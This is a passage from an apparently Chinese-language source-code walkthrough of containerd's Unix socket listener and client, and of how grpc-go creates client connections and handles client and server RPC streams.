serveFunc(l); err != nil { log.G(ctx).WithError(err).WithField(\u0026#34;address\u0026#34;, path).Fatal(\u0026#34;serve failure\u0026#34;) } }() } 在启动 gRPC 中调用了sys.GetLocalListener()，这个函数在下面的函数中被定义。\n文件路径：containerd/pkg/sys/socket_unix.go，这个文件涉及到了uds文件的创建。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 package sys import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; \u0026#34;path/filepath\u0026#34; \u0026#34;golang.org/x/sys/unix\u0026#34; ) // CreateUnixSocket creates a unix socket and returns the listener func CreateUnixSocket(path string) (net.Listener, error) { // BSDs have a 104 limit if len(path) \u0026gt; 104 { return nil, fmt.Errorf(\u0026#34;%q: unix socket path too long (\u0026gt; 104)\u0026#34;, path) } if err := os.MkdirAll(filepath.Dir(path), 0660); err != nil { return nil, err } if err := unix.Unlink(path); err != nil \u0026amp;\u0026amp; !os.IsNotExist(err) { return nil, err } return net.Listen(\u0026#34;unix\u0026#34;, path) } // GetLocalListener returns a listener out of a unix socket. func GetLocalListener(path string, uid, gid int) (net.Listener, error) { // Ensure parent directory is created if err := mkdirAs(filepath.Dir(path), uid, gid); err != nil { return nil, err } l, err := CreateUnixSocket(path) if err != nil { return l, err } if err := os.Chmod(path, 0660); err != nil { l.Close() return nil, err } if err := os.Chown(path, uid, gid); err != nil { l.Close() return nil, err } return l, nil } func mkdirAs(path string, uid, gid int) error { if _, err := os.Stat(path); !os.IsNotExist(err) { return err } if err := os.MkdirAll(path, 0770); err != nil { return err } return os.Chown(path, uid, gid) } 详细分析：\nCreateUnixSocket 函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 func CreateUnixSocket(path string) (net.Listener, error) { // BSDs have a 104 limit if len(path) \u0026gt; 104 { return nil, fmt.Errorf(\u0026#34;%q: unix socket path too long (\u0026gt; 104)\u0026#34;, path) } if err := os.MkdirAll(filepath.Dir(path), 0660); err != nil { return nil, err } if err := unix.Unlink(path); err != nil \u0026amp;\u0026amp; !os.IsNotExist(err) { return nil, err } return net.Listen(\u0026#34;unix\u0026#34;, path) } CreateUnixSocket 函数用于创建一个 Unix Domain Socket，并返回一个用于监听连接的 net.Listener 实例。\n详细分析：\n路径长度检查：首先，函数检查套接字路径的长度是否超过了 104 个字符。这是因为在一些 BSD 系统中，Unix Domain Socket 的路径长度限制为 104 个字符。如果路径太长，函数会返回一个错误。 创建父目录：使用 os.MkdirAll 创建 Unix Socket 的父目录。如果该目录不存在，MkdirAll 会递归地创建目录。目录权限设置为 0660。 删除现有的 Unix Socket 文件：调用 unix.Unlink 尝试删除指定路径上的现有文件（如果存在），以确保新创建的套接字文件不会与旧文件冲突。如果文件不存在，Unlink 会返回一个错误，但如果错误类型是 os.IsNotExist，表示文件本来就不存在，这时会忽略这个错误。 创建 Unix Socket：最后，使用 net.Listen(\u0026quot;unix\u0026quot;, path) 创建一个 Unix Domain Socket，并返回一个 net.Listener，供后续使用。 GetLocalListener 函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 func GetLocalListener(path string, uid, gid int) (net.Listener, error) { // Ensure parent directory is created if err := mkdirAs(filepath.Dir(path), uid, gid); err != nil { return nil, err } l, err := CreateUnixSocket(path) if err != nil { return l, err } if err := os.Chmod(path, 0660); err != nil { l.Close() return nil, err } if err := os.Chown(path, uid, gid); err != nil { l.Close() return nil, err } return l, nil } GetLocalListener 函数用于创建一个本地的 Unix Domain Socket 监听器，并设置相应的权限和所有者信息。\n详细分析：\n创建父目录：调用 mkdirAs 函数确保 Unix Socket 的父目录已经创建，并设置了适当的用户 ID (uid) 和组 ID (gid)。 创建 Unix Socket：使用 CreateUnixSocket 函数创建 Unix Domain Socket。 设置权限：使用 os.Chmod 设置 Unix Socket 文件的权限为 0660，即文件所有者和组成员可读写，其他用户无权限。 设置所有者：使用 os.Chown 将 Unix Socket 文件的所有者和组设置为指定的 uid 和 gid。 返回监听器：如果所有操作都成功，返回创建的 net.Listener 实例。如果在过程中发生错误，关闭已创建的监听器，并返回错误信息。 mkdirAs 函数\n1 2 3 4 5 6 7 8 9 10 11 func mkdirAs(path string, uid, gid int) error { if _, err := os.Stat(path); !os.IsNotExist(err) { return err } if err := os.MkdirAll(path, 0770); err != nil { return err } return os.Chown(path, uid, gid) } mkdirAs 函数用于创建指定的目录，并设置该目录的所有者和权限。\n详细分析：\n检查目录是否存在：使用 os.Stat 检查目标目录是否已经存在。如果目录存在，返回该目录的状态信息或错误。如果目录不存在，继续执行。 创建目录：使用 os.MkdirAll 创建目标目录，并将权限设置为 0770（即所有者和组成员可以读写执行，其他用户无权限）。 设置所有者：使用 os.Chown 将目录的所有者和组设置为指定的 uid 和 gid。 返回结果：如果所有操作都成功，返回 nil。如果任何步骤出错，则返回相应的错误信息。 client与containerd守护进程的通信 文件路径：containerd/client/client.go，这段代码是 containerd 项目中 client 包的实现，负责创建与 containerd 守护进程通信的客户端实例。它包含了与 containerd 进行 gRPC 通信的基础设施，提供了一组方法，用于与 containerd 的各种服务进行交互，例如容器管理、镜像管理、快照管理等。\nClient 结构体 1 2 3 4 5 6 7 8 9 type Client struct { services connMu sync.Mutex conn *grpc.ClientConn runtime string defaultns string platform platforms.MatchComparer connector func() (*grpc.ClientConn, error) } services: 内嵌的 services 结构体，包含了与 containerd 服务通信的具体方法，如 ContainerService、ImageService 等。 conn: 一个 gRPC 连接对象，用于与 containerd 守护进程通信。 connMu: 一个互斥锁，用于在多线程环境下保护 conn 对象的并发访问。 runtime: 表示当前使用的容器运行时。 defaultns: 客户端的默认命名空间。 platform: 平台匹配器，用于确定运行在特定平台上的容器。 connector: 一个函数，用于重新连接到 containerd 守护进程。 New 函数 New 函数用于创建一个新的 Client 实例，连接到指定的 containerd 守护进程地址。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 func New(address string, opts ...Opt) (*Client, error) { var copts clientOpts for _, o := range opts { if err := o(\u0026amp;copts); err != nil { return nil, err } } if copts.timeout == 0 { copts.timeout = 10 * time.Second } c := \u0026amp;Client{ defaultns: copts.defaultns, } if copts.defaultRuntime != \u0026#34;\u0026#34; { c.runtime = copts.defaultRuntime } else { c.runtime = defaults.DefaultRuntime } if copts.defaultPlatform != nil { c.platform = copts.defaultPlatform } else { c.platform = platforms.Default() } if copts.services != nil { c.services = *copts.services } if address != \u0026#34;\u0026#34; { backoffConfig := backoff.DefaultConfig backoffConfig.MaxDelay = copts.timeout connParams := grpc.ConnectParams{ Backoff: backoffConfig, } gopts := []grpc.DialOption{ grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithConnectParams(connParams), grpc.WithContextDialer(dialer.ContextDialer), } if len(copts.dialOptions) \u0026gt; 0 { gopts = copts.dialOptions } gopts = append(gopts, grpc.WithDefaultCallOptions( grpc.MaxCallRecvMsgSize(defaults.DefaultMaxRecvMsgSize), grpc.MaxCallSendMsgSize(defaults.DefaultMaxSendMsgSize))) if len(copts.callOptions) \u0026gt; 0 { gopts = append(gopts, grpc.WithDefaultCallOptions(copts.callOptions...)) } if copts.defaultns != \u0026#34;\u0026#34; { unary, stream := newNSInterceptors(copts.defaultns) gopts = append(gopts, grpc.WithChainUnaryInterceptor(unary)) gopts = append(gopts, grpc.WithChainStreamInterceptor(stream)) } connector := func() (*grpc.ClientConn, error) { conn, err := grpc.NewClient(dialer.DialAddress(address), gopts...) //gRPC连接 if err != nil { return nil, fmt.Errorf(\u0026#34;failed to dial %q: %w\u0026#34;, address, err) } return conn, nil } conn, err := connector() if err != nil { return nil, err } c.conn, c.connector = conn, connector } if copts.services == nil \u0026amp;\u0026amp; c.conn == nil { return nil, fmt.Errorf(\u0026#34;no grpc connection or services is available: %w\u0026#34;, errdefs.ErrUnavailable) } // check namespace labels for default runtime if copts.defaultRuntime == \u0026#34;\u0026#34; \u0026amp;\u0026amp; c.defaultns != \u0026#34;\u0026#34; { if label, err := c.GetLabel(context.Background(), defaults.DefaultRuntimeNSLabel); err != nil { return nil, err } else if label != \u0026#34;\u0026#34; { c.runtime = label } } return c, nil } 选项解析: copts 用于存储客户端配置选项，通过传入的 opts 进行解析配置。 默认配置设置: 如果未指定运行时、平台等选项，使用默认值进行初始化。 gRPC 连接: 配置了连接参数和拨号选项（如超时、TLS、安全凭证等）。 使用 grpc.NewClient 建立到 containerd 守护进程的 gRPC 连接。 连接成功后，保存连接对象 conn 和重新连接的函数 connector。 命名空间标签检查: 如果没有指定运行时，并且设置了默认命名空间，会尝试从命名空间标签中获取默认运行时。 错误处理: 如果无法建立 gRPC 连接，或未提供连接或服务，则返回错误。 NewWithConn 函数 NewWithConn 函数用于创建一个与现有的 gRPC 连接关联的 Client 实例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 func NewWithConn(conn *grpc.ClientConn, opts ...Opt) (*Client, error) { var copts clientOpts for _, o := range opts { if err := o(\u0026amp;copts); err != nil { return nil, err } } c := \u0026amp;Client{ defaultns: copts.defaultns, conn: conn, runtime: defaults.DefaultRuntime, } if copts.defaultPlatform != nil { c.platform = copts.defaultPlatform } else { c.platform = platforms.Default() } // check namespace labels for default runtime if copts.defaultRuntime == \u0026#34;\u0026#34; \u0026amp;\u0026amp; c.defaultns != \u0026#34;\u0026#34; { if label, err := c.GetLabel(context.Background(), defaults.DefaultRuntimeNSLabel); err != nil { return nil, err } else if label != \u0026#34;\u0026#34; { c.runtime = label } } if copts.services != nil { c.services = *copts.services } return c, nil } 参数说明: conn: 一个现有的 gRPC 连接实例。 opts: 可选的客户端配置选项。 初始化: 与 New 函数类似，初始化 Client 实例，设置默认运行时和平台。 如果传入了服务配置 services，则使用该配置。 Reconnect 函数 Reconnect 函数用于重新建立与 containerd 守护进程的 gRPC 连接。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 func (c *Client) Reconnect() error { if c.connector == nil { return fmt.Errorf(\u0026#34;unable to reconnect to containerd, no connector available: %w\u0026#34;, errdefs.ErrUnavailable) } c.connMu.Lock() defer c.connMu.Unlock() c.conn.Close() conn, err := c.connector() if err != nil { return err } c.conn = conn return nil } 锁定连接: 使用 connMu 互斥锁来防止并发修改 conn 对象。 关闭旧连接: 关闭现有的 gRPC 连接。 重新连接: 使用 connector 函数重新建立连接，并将新连接赋值给 conn。 IsServing 函数 IsServing 函数用于检查 containerd 守护进程是否正在运行，并返回 SERVING 状态。\n1 2 3 4 5 6 7 8 9 10 11 12 13 func (c *Client) IsServing(ctx context.Context) (bool, error) { c.connMu.Lock() if c.conn == nil { c.connMu.Unlock() return false, fmt.Errorf(\u0026#34;no grpc connection available: %w\u0026#34;, errdefs.ErrUnavailable) } c.connMu.Unlock() r, err := c.HealthService().Check(ctx, \u0026amp;grpc_health_v1.HealthCheckRequest{}, grpc.WaitForReady(true)) if err != nil { return false, err } return r.Status == grpc_health_v1.HealthCheckResponse_SERVING, nil } 锁定连接: 确保在检查连接状态时不会有其他线程修改 conn 对象。 健康检查: 调用 HealthService().Check 方法，检查 containerd 的健康状态，确定服务是否可用。 返回值: 如果服务正在运行并返回 SERVING 状态，则返回 true，否则返回 false 和错误信息。 在 containerd 的代码中，调用 grpc.NewClient 函数实际上是直接使用 gRPC 库中的这个函数来创建 gRPC 客户端连接。这个函数内部会创建和管理与 containerd 服务器的 gRPC 连接，下一部分将详细分析gRPC框架。\n源码链接：grpc-go/clientconn.go at v1.65.0 · grpc/grpc-go (github.com)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 func NewClient(target string, opts ...DialOption) (conn *ClientConn, err error) { cc := \u0026amp;ClientConn{ target: target, conns: make(map[*addrConn]struct{}), dopts: defaultDialOptions(), } cc.retryThrottler.Store((*retryThrottler)(nil)) cc.safeConfigSelector.UpdateConfigSelector(\u0026amp;defaultConfigSelector{nil}) cc.ctx, cc.cancel = context.WithCancel(context.Background()) // Apply dial options. disableGlobalOpts := false for _, opt := range opts { if _, ok := opt.(*disableGlobalDialOptions); ok { disableGlobalOpts = true break } } if !disableGlobalOpts { for _, opt := range globalDialOptions { opt.apply(\u0026amp;cc.dopts) } } for _, opt := range opts { opt.apply(\u0026amp;cc.dopts) } // Determine the resolver to use. if err := cc.initParsedTargetAndResolverBuilder(); err != nil { return nil, err } for _, opt := range globalPerTargetDialOptions { opt.DialOptionForTarget(cc.parsedTarget.URL).apply(\u0026amp;cc.dopts) } chainUnaryClientInterceptors(cc) chainStreamClientInterceptors(cc) if err := cc.validateTransportCredentials(); err != nil { return nil, err } if cc.dopts.defaultServiceConfigRawJSON != nil { scpr := parseServiceConfig(*cc.dopts.defaultServiceConfigRawJSON, cc.dopts.maxCallAttempts) if scpr.Err != nil { return nil, fmt.Errorf(\u0026#34;%s: %v\u0026#34;, invalidDefaultServiceConfigErrPrefix, scpr.Err) } cc.dopts.defaultServiceConfig, _ = scpr.Config.(*ServiceConfig) } cc.mkp = cc.dopts.copts.KeepaliveParams if err = cc.initAuthority(); err != nil { return nil, err } // Register ClientConn with channelz. Note that this is only done after // channel creation cannot fail. cc.channelzRegistration(target) channelz.Infof(logger, cc.channelz, \u0026#34;parsed dial target is: %#v\u0026#34;, cc.parsedTarget) channelz.Infof(logger, cc.channelz, \u0026#34;Channel authority set to %q\u0026#34;, cc.authority) cc.csMgr = newConnectivityStateManager(cc.ctx, cc.channelz) cc.pickerWrapper = newPickerWrapper(cc.dopts.copts.StatsHandlers) cc.initIdleStateLocked() // Safe to call without the lock, since nothing else has a reference to cc. cc.idlenessMgr = idle.NewManager((*idler)(cc), cc.dopts.idleTimeout) return cc, nil } 在 gRPC 框架中，NewClient 函数负责为给定的目标 URI 创建一个 gRPC “通道”（即 ClientConn）。ClientConn 是 gRPC 客户端与服务器之间的虚拟连接，它可以根据需要创建多个实际连接。这个函数主要执行以下任务：\n解析目标 URI：根据目标 URI 的方案（如 dns:// 或 passthrough://），选择合适的解析器来解析服务地址。 配置连接参数：应用各种拨号选项（如安全凭证、负载均衡策略、重试策略等），并初始化 ClientConn 的状态。 创建连接：在后台尝试与目标地址建立连接，并根据连接状态更新 ClientConn 的状态。 管理连接生命周期：在连接的生命周期中，ClientConn 会自动处理连接失败、重连、负载均衡等逻辑。 gRPC框架中的RPC通信 gRPC-Go 中 RPC 通信 Go版本gRPC通信机制概述 在 gRPC-Go 中，客户端发起的每一个 RPC 调用都会涉及到以下几个步骤：\n发起 RPC 请求：客户端创建一个 RPC 调用，并发送元数据和请求数据。 服务器处理请求：服务器接收到请求，处理并生成响应。 发送响应：服务器将响应发送回客户端。 接收响应：客户端接收到响应，并将结果返回给用户。 Go版本gRPC源码结构 gRPC-Go 的源码主要分为以下几个模块：\ntransport：负责底层 HTTP/2 传输的实现。 stream：管理和控制 gRPC 的流。 server 和 client：分别管理 gRPC 服务器和客户端的生命周期。 codec：用于消息的编码和解码。 gRPC-Go 中 RPC 通信流程的源码分析 ClientConn 的初始化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 func NewClient(target string, opts ...DialOption) (*ClientConn, error) { cc := \u0026amp;ClientConn{ target: target, conns: make(map[*addrConn]struct{}), dopts: defaultDialOptions(), } // 解析 target 地址，选择合适的 resolver (解析器) if err := cc.initParsedTargetAndResolverBuilder(); err != nil { return nil, err } // 初始化连接管理和负载均衡 cc.csMgr = newConnectivityStateManager(cc.ctx, cc.channelz) cc.pickerWrapper = newPickerWrapper(cc.dopts.copts.StatsHandlers) return cc, nil } RPC 请求的发起 在 gRPC-Go 中，RPC 请求的发起主要通过 invoke 方法。这个方法位于 google.golang.org/grpc 包的 call.go 文件中：\n1 2 3 4 5 6 7 8 9 10 func invoke(ctx context.Context, method string, req, reply any, cc *ClientConn, opts ...CallOption) error { cs, err := newClientStream(ctx, unaryStreamDesc, cc, method, opts...) if err != nil { return err } if err := cs.SendMsg(req); err != nil { return err } return cs.RecvMsg(reply) } invoke 方法是客户端执行单个 RPC 调用的入口。它首先通过 newClientStream 方法创建一个新的客户端流（ClientStream），然后发送消息并接收响应。\n创建 ClientStream newClientStream 的实现位于 google.golang.org/grpc 包的 stream.go 文件中，它负责初始化 gRPC 的流：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 func newClientStream(ctx context.Context, desc *StreamDesc, cc *ClientConn, method string, opts ...CallOption) (_ ClientStream, err error) { // 初始化 stream，设置传输层 t, err := cc.getTransport(ctx, opts...) if err != nil { return nil, err } // 开始流 s, err := t.NewStream(ctx, hdr) if err != nil { return nil, err } return \u0026amp;clientStream{s: s, desc: desc}, nil } 这里的 NewStream 方法是由 transport 层来处理的，它将创建一个新的 HTTP/2 流，用于后续的消息传输。\n传输层（Transport Layer） 在 gRPC-Go 中，传输层的核心实现位于 transport/http2_client.go 中。这个文件包含了 gRPC 使用 HTTP/2 进行数据传输的核心逻辑。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 func (t *http2Client) NewStream(ctx context.Context, callHdr *CallHdr) (_ *Stream, err error) { // 创建 HTTP/2 流 t.mu.Lock() s := \u0026amp;Stream{ ... } t.activeStreams[s.id] = s t.mu.Unlock() // 发送请求头部 err = t.framer.writeHeaders(s, ...) if err != nil { return nil, err } return s, nil } NewStream 方法创建一个新的 HTTP/2 流，并通过 writeHeaders 方法将 gRPC 请求的元数据发送到服务器。\n消息的发送和接收 在客户端流中，消息的发送和接收通过 SendMsg 和 RecvMsg 方法来完成，这些方法同样位于 stream.go 文件中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 //(cs *clientStream) SendMsg(m any) (err error)函数gRPC-Go 客户端用于发送消息的核心方法。它执行了从消息准备到实际发送的整个过程，并处理错误和重试逻辑。 func (cs *clientStream) SendMsg(m any) (err error) { //错误处理的 defer 逻辑 defer func() { if err != nil \u0026amp;\u0026amp; err != io.EOF { cs.finish(err) } }() if cs.sentLast { //防止重复调用 return status.Errorf(codes.Internal, \u0026#34;SendMsg called after CloseSend\u0026#34;) } if !cs.desc.ClientStreams { //处理非客户端流式的 RPC cs.sentLast = true } // load hdr, payload, data hdr, payload, data, err := prepareMsg(m, cs.codec, cs.cp, cs.comp) if err != nil { //准备消息数据，比如编码什么的 return err } // TODO(dfawley): should we be checking len(data) instead? if len(payload) \u0026gt; *cs.callInfo.maxSendMessageSize { //检查消息大小 return status.Errorf(codes.ResourceExhausted, \u0026#34;trying to send message larger than max (%d vs. %d)\u0026#34;, len(payload), *cs.callInfo.maxSendMessageSize) } op := func(a *csAttempt) error { //消息发送逻辑和重试机制 return a.sendMsg(m, hdr, payload, data) } err = cs.withRetry(op, func() { cs.bufferForRetryLocked(len(hdr)+len(payload), op) }) if len(cs.binlogs) != 0 \u0026amp;\u0026amp; err == nil { //二进制日志记录 cm := \u0026amp;binarylog.ClientMessage{ OnClientSide: true, Message: data, } for _, binlog := range cs.binlogs { binlog.Log(cs.ctx, cm) } } return err } //func (cs *clientStream) RecvMsg(m any) error 是 gRPC-Go 客户端用于接收服务器响应消息的核心方法。这个函数在客户端接收服务器的响应时执行，并包括了错误处理、重试机制、以及日志记录等功能。 func (cs *clientStream) RecvMsg(m any) error { //二进制日志记录初始化 if len(cs.binlogs) != 0 \u0026amp;\u0026amp; !cs.serverHeaderBinlogged { // Call Header() to binary log header if it\u0026#39;s not already logged. cs.Header() } //接收信息的初始化 var recvInfo *payloadInfo if len(cs.binlogs) != 0 { recvInfo = \u0026amp;payloadInfo{} } //消息接收逻辑及重试机制 err := cs.withRetry(func(a *csAttempt) error { return a.recvMsg(m, recvInfo) }, cs.commitAttemptLocked) //二进制日志记录处理 if len(cs.binlogs) != 0 \u0026amp;\u0026amp; err == nil { sm := \u0026amp;binarylog.ServerMessage{ OnClientSide: true, Message: recvInfo.uncompressedBytes, } for _, binlog := range cs.binlogs { binlog.Log(cs.ctx, sm) } } // 结束流或处理错误 if err != nil || !cs.desc.ServerStreams { // err != nil or non-server-streaming indicates end of stream. cs.finish(err) } return err } 上面的SendMsg 和 RecvMsg 方法实际调用了更底层的sendMsg和recvMsg。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 //sendMsg 函数的主要职责是将编码后的消息通过底层传输层发送给服务器，并处理发送过程中的错误和统计信息。 func (a *csAttempt) sendMsg(m any, hdr, payld, data []byte) error { cs := a.cs if a.trInfo != nil { a.mu.Lock() if a.trInfo.tr != nil { a.trInfo.tr.LazyLog(\u0026amp;payload{sent: true, msg: m}, true) } a.mu.Unlock() } if err := a.t.Write(a.s, hdr, payld, \u0026amp;transport.Options{Last: !cs.desc.ClientStreams}); err != nil { if !cs.desc.ClientStreams { // For non-client-streaming RPCs, we return nil instead of EOF on error // because the generated code requires it. finish is not called; RecvMsg() // will call it with the stream\u0026#39;s status independently. return nil } return io.EOF } for _, sh := range a.statsHandlers { sh.HandleRPC(a.ctx, outPayload(true, m, data, payld, time.Now())) } if channelz.IsOn() { a.t.IncrMsgSent() } return nil } //recvMsg 函数的主要职责是从服务器接收消息并解码，同时处理接收过程中的错误、解压缩和统计信息。 func (a *csAttempt) recvMsg(m any, payInfo *payloadInfo) (err error) { cs := a.cs if len(a.statsHandlers) != 0 \u0026amp;\u0026amp; payInfo == nil { payInfo = \u0026amp;payloadInfo{} } if !a.decompSet { // Block until we receive headers containing received message encoding. if ct := a.s.RecvCompress(); ct != \u0026#34;\u0026#34; \u0026amp;\u0026amp; ct != encoding.Identity { if a.dc == nil || a.dc.Type() != ct { // No configured decompressor, or it does not match the incoming // message encoding; attempt to find a registered compressor that does. a.dc = nil a.decomp = encoding.GetCompressor(ct) } } else { // No compression is used; disable our decompressor. a.dc = nil } // Only initialize this state once per stream. a.decompSet = true } err = recv(a.p, cs.codec, a.s, a.dc, m, *cs.callInfo.maxReceiveMessageSize, payInfo, a.decomp) if err != nil { if err == io.EOF { if statusErr := a.s.Status().Err(); statusErr != nil { return statusErr } return io.EOF // indicates successful end of stream. } return toRPCErr(err) } if a.trInfo != nil { a.mu.Lock() if a.trInfo.tr != nil { a.trInfo.tr.LazyLog(\u0026amp;payload{sent: false, msg: m}, true) } a.mu.Unlock() } for _, sh := range a.statsHandlers { sh.HandleRPC(a.ctx, \u0026amp;stats.InPayload{ Client: true, RecvTime: time.Now(), Payload: m, // TODO truncate large payload. Data: payInfo.uncompressedBytes, WireLength: payInfo.compressedLength + headerLen, CompressedLength: payInfo.compressedLength, Length: len(payInfo.uncompressedBytes), }) } if channelz.IsOn() { a.t.IncrMsgRecv() } if cs.desc.ServerStreams { // Subsequent messages should be received by subsequent RecvMsg calls. return nil } // Special handling for non-server-stream rpcs. // This recv expects EOF or errors, so we don\u0026#39;t collect inPayload. err = recv(a.p, cs.codec, a.s, a.dc, m, *cs.callInfo.maxReceiveMessageSize, nil, a.decomp) if err == nil { return toRPCErr(errors.New(\u0026#34;grpc: client streaming protocol violation: get \u0026lt;nil\u0026gt;, want \u0026lt;EOF\u0026gt;\u0026#34;)) } if err == io.EOF { return a.s.Status().Err() // non-server streaming Recv returns nil on success } return toRPCErr(err) } 服务器端的处理 在服务器端，RPC 调用的处理通过 handleStream 函数进行管理。这个函数位于 server.go 文件中，handleStream 方法处理传入的流，解析客户端的请求，并调用相应的服务方法来生成响应。\n上下文初始化和追踪信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ctx := stream.Context() ctx = contextWithServer(ctx, s) var ti *traceInfo if EnableTracing { tr := newTrace(\u0026#34;grpc.Recv.\u0026#34;+methodFamily(stream.Method()), stream.Method()) ctx = newTraceContext(ctx, tr) ti = \u0026amp;traceInfo{ tr: tr, firstLine: firstLine{ client: false, remoteAddr: t.Peer().Addr, }, } if dl, ok := ctx.Deadline(); ok { ti.firstLine.deadline = time.Until(dl) } } 上下文准备：从流中提取出上下文，并将服务器相关的信息添加到上下文中。 追踪信息：如果启用了追踪（EnableTracing），函数会创建一个新的追踪对象，并将其添加到上下文中。追踪对象用于记录请求的处理过程和相关的元数据（如客户端地址、截止时间等）。 解析方法名称\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 sm := stream.Method() if sm != \u0026#34;\u0026#34; \u0026amp;\u0026amp; sm[0] == \u0026#39;/\u0026#39; { sm = sm[1:] } pos := strings.LastIndex(sm, \u0026#34;/\u0026#34;) if pos == -1 { // 处理错误的请求方法 if ti != nil { ti.tr.LazyLog(\u0026amp;fmtStringer{\u0026#34;Malformed method name %q\u0026#34;, []any{sm}}, true) ti.tr.SetError() } errDesc := fmt.Sprintf(\u0026#34;malformed method name: %q\u0026#34;, stream.Method()) if err := t.WriteStatus(stream, status.New(codes.Unimplemented, errDesc)); err != nil { if ti != nil { ti.tr.LazyLog(\u0026amp;fmtStringer{\u0026#34;%v\u0026#34;, []any{err}}, true) ti.tr.SetError() } channelz.Warningf(logger, s.channelz, \u0026#34;grpc: Server.handleStream failed to write status: %v\u0026#34;, err) } if ti != nil { ti.tr.Finish() } return } service := sm[:pos] method := sm[pos+1:] 方法名称解析：从请求的 Method 中解析出服务名和方法名。如果解析失败（例如方法名称格式不正确），则立即返回一个 Unimplemented 错误状态。 处理元数据和统计信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 md, _ := metadata.FromIncomingContext(ctx) for _, sh := range s.opts.statsHandlers { ctx = sh.TagRPC(ctx, \u0026amp;stats.RPCTagInfo{FullMethodName: stream.Method()}) sh.HandleRPC(ctx, \u0026amp;stats.InHeader{ FullMethod: stream.Method(), RemoteAddr: t.Peer().Addr, LocalAddr: t.Peer().LocalAddr, Compression: stream.RecvCompress(), WireLength: stream.HeaderWireLength(), Header: md, }) } stream.SetContext(ctx) 元数据提取：从上下文中提取元数据（metadata），例如请求头中的信息。 统计处理：遍历所有已配置的统计处理器，并调用它们来记录此次 RPC 调用的统计数据。 根据方法名称选择处理器\n1 2 3 4 5 6 7 8 9 10 11 srv, knownService := s.services[service] if knownService { if md, ok := srv.methods[method]; ok { s.processUnaryRPC(ctx, t, stream, srv, md, ti) return } if sd, ok := srv.streams[method]; ok { s.processStreamingRPC(ctx, t, stream, srv, sd, ti) return } } 服务和方法查找：根据解析出的服务名和方法名，在注册的服务中查找对应的服务对象和方法。 处理请求：如果找到对应的处理器，则调用 processUnaryRPC 或 processStreamingRPC 来处理请求。这两个函数分别用于处理单向 RPC 和流式 RPC。 处理未知服务或方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 if unknownDesc := s.opts.unknownStreamDesc; unknownDesc != nil { s.processStreamingRPC(ctx, t, stream, nil, unknownDesc, ti) return } var errDesc string if !knownService { errDesc = fmt.Sprintf(\u0026#34;unknown service %v\u0026#34;, service) } else { errDesc = fmt.Sprintf(\u0026#34;unknown method %v for service %v\u0026#34;, method, service) } if ti != nil { ti.tr.LazyPrintf(\u0026#34;%s\u0026#34;, errDesc) ti.tr.SetError() } if err := t.WriteStatus(stream, status.New(codes.Unimplemented, errDesc)); err != nil { if ti != nil { ti.tr.LazyLog(\u0026amp;fmtStringer{\u0026#34;%v\u0026#34;, []any{err}}, true) ti.tr.SetError() } channelz.Warningf(logger, s.channelz, \u0026#34;grpc: Server.handleStream failed to write status: %v\u0026#34;, err) } if ti != nil { ti.tr.Finish() } 处理未知服务或方法：如果服务或方法未找到，函数会返回一个 Unimplemented 状态，表示客户端请求的服务或方法不存在。如果配置了 unknownStreamDesc，将调用其处理器来处理未知的请求，否则直接返回错误。 我们这里继续往下分析processStreamingRPC函数\nprocessStreamingRPC 是 gRPC-Go 服务器端处理流式 RPC 请求的关键函数。它负责处理客户端与服务器之间的双向或单向流式 RPC 调用。这个函数执行的主要任务包括：初始化上下文和流、处理压缩和解压缩、调用实际的 RPC 方法处理器，并在完成后记录日志和状态。\n1、函数结构概述\nprocessStreamingRPC 处理流式 RPC 的核心逻辑可以分为以下几个主要部分：\n初始化上下文和追踪信息。 初始化流（serverStream）对象。 处理压缩和解压缩逻辑。 调用实际的 RPC 处理器。 处理 RPC 调用后的清理和日志记录。 2、关键步骤解析\n初始化上下文和追踪信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 if channelz.IsOn() { s.incrCallsStarted() } shs := s.opts.statsHandlers var statsBegin *stats.Begin if len(shs) != 0 { beginTime := time.Now() statsBegin = \u0026amp;stats.Begin{ BeginTime: beginTime, IsClientStream: sd.ClientStreams, IsServerStream: sd.ServerStreams, } for _, sh := range 